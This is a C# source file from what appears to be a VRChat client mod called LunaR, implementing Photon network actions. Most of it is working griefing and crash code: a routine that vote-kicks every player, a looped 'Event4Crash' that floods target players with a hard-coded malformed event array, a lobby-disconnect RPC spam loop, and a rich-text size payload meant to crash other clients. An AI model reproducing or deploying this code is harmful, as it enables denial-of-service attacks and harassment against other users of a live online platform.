using ExitGames.Client.Photon;
using LunaR.Extensions;
using LunaR.Wrappers;
using Photon.Realtime;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using UnhollowerBaseLib;
using UnityEngine;
using VRC.Core;
using VRC.SDKBase;
using static VRC.SDKBase.VRC_EventHandler;

namespace LunaR.Modules
{
    internal static class PhotonModule
    {
        public static bool Invisible = false;

        public static void OpRaiseEvent(byte code, object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
        {
            OpRaiseEvent(code, IL2CPPSerializer.ManagedToIL2CPP.Serialize(customObject), RaiseEventOptions, sendOptions);
        }

        public static void OpRaiseEvent(byte code, Il2CppSystem.Object customObject, RaiseEventOptions RaiseEventOptions, SendOptions sendOptions)
        {
            Utils.VRCNetworkingClient.prop_LoadBalancingPeer_0.Method_Public_Virtual_New_Boolean_Byte_Object_RaiseEventOptions_SendOptions_0(code, customObject, RaiseEventOptions, sendOptions);
        }

        public static void VoteKickAll()
        {
            foreach (Player PhotonPlayer in Utils.VRCNetworkingClient.GetAllPhotonPlayers())
            {
                if (PhotonPlayer.UserID() != APIUser.CurrentUser.UserID()) VoteKick(PhotonPlayer.UserID());
            }
        }

        public static void VoteKick(string UserID)
        {
            if (!UserID.StartsWith("usr_")) return;
            OpRaiseEvent(33, new Dictionary<byte, object>
            {
                { 0, (byte)5 },
                { 1, UserID },
            }, default, SendOptions.SendReliable);
        }

        public static void AcceptKick(string KickID)
        {
            if (KickID == "") return;
            OpRaiseEvent(33, new Dictionary<byte, object>
            {
                { 0, (byte)13 },
                { 3, KickID },
            }, default, SendOptions.SendReliable);
        }

        public static void Block(string userid, bool Block)
        {
            if (!userid.StartsWith("usr_")) return;
            OpRaiseEvent(33, new Dictionary<byte, object>
            {
                { 3, Block },
                { 0, (byte)22 },
                { 1, userid },
            }, default, SendOptions.SendReliable);
        }

        public static void Mute(string userid, bool Mute)
        {
            if (!userid.Contains("usr_")) return;
            OpRaiseEvent(33, new Dictionary<byte, object>
            {
                { 0, (byte)23 },
                { 1, userid },
                { 3, Mute },
            }, default, SendOptions.SendReliable);
        }

        public static void SendOwnership(int viewid, int Actor)
        {
            int[] Request = new int[2] { viewid, Actor };
            OpRaiseEvent(210, Request, new RaiseEventOptions { field_Public_ReceiverGroup_0 = ReceiverGroup.All }, SendOptions.SendReliable);
        }

        public static bool Ev4Crash = false;
        public static IEnumerator Event4Spam(int[] TargetActors)
        {
            Ev4Crash = true;
            while (Ev4Crash && GeneralWrappers.IsInWorld())
            {
                Event4Crash(TargetActors);
                yield return new WaitForSeconds(0.12f);
            }
            Ev4Crash = false;
        }

        public static void Event4Crash(int[] TargetActors)
        {
            byte[] CrashEvent = new byte[] { 106, 41, 132, 86, 142, 235, 0, 0, 0, 9, 0, 58, 49, 54, 54, 57, 52, 69, 49, 47, 14, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 13, 0, 83, 112, 97, 119, 110, 69, 109, 111, 106, 105, 82, 80, 67, 0, 0, 0, 0, 4, 8, 0, 2, 10, 1, 0, 5, 49, 0, 0, 0 };
            Buffer.BlockCopy(BitConverter.GetBytes(Utils.VRCNetworkingClient.field_Private_LoadBalancingPeer_0.ServerTimeInMilliSeconds), 0, CrashEvent, 1, 4);
            Buffer.BlockCopy(BitConverter.GetBytes(Utils.VRCNetworkingClient.GetSelf().ActorID()), 0, CrashEvent, 5, 4);
            CrashEvent[58] = (byte)Utils.Random.Next(0, 255);
            byte[][] EventArray = new byte[][]
            {
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent,
                CrashEvent
            };

            if (Utils.VRCNetworkingClient.GetSelf().IsMaster()) OpRaiseEvent(4, EventArray, new RaiseEventOptions
            {
                field_Public_ArrayOf_Int32_0 = TargetActors,
            }, SendOptions.SendReliable);
        }


        public static bool DisconnectToggle = false;
        public static IEnumerator DisconnectLobby()
        {
            DisconnectToggle = true;
            while (DisconnectToggle && GeneralWrappers.IsInWorld())
            {
                SendRPC(VrcEventType.SendRPC, Utils.RandomString(50), false, VrcBooleanOp.Unused, Networking.SceneEventHandler.gameObject, null, "<3 LunaR <3 | " + Utils.RandomString(760) + " | <3 LunaR <3", 0, 1, null, VrcBroadcastType.Always);
                yield return new WaitForSeconds(0.2f);
            }
            DisconnectToggle = false;
        }

        public static void CrashWorldClient()
        {
            string Data = "rtYKZRlV7sTx76sL</noparse>:<size=-999999em>";
            for (int i = 0; i < 5; i++)
            {
                Networking.RPC(0, new GameObject("S3fe35HsXY"), Data, new Il2CppSystem.Object[0]);
            }
        }

        public static void SendRPC(VrcEventType EventType, string Name, bool ParameterBool, VrcBooleanOp BoolOP, GameObject ParamObject, GameObject[] ParamObjects, string ParamString, float Float, int Int, byte[] bytes, VrcBroadcastType BroadcastType, float Fastforward = 0)
        {
            VrcEvent a = new()
            {
                EventType = EventType,
                Name = Name,
                ParameterBool = ParameterBool,
                ParameterBoolOp = BoolOP,
                ParameterBytes = bytes,
                ParameterObject = ParamObject,
                ParameterObjects = ParamObjects,
                ParameterString = ParamString,
                ParameterFloat = Float,
                ParameterInt = Int,
            };
            Networking.SceneEventHandler.TriggerEvent(a, BroadcastType, ParamObject, Fastforward);
        }
    }
}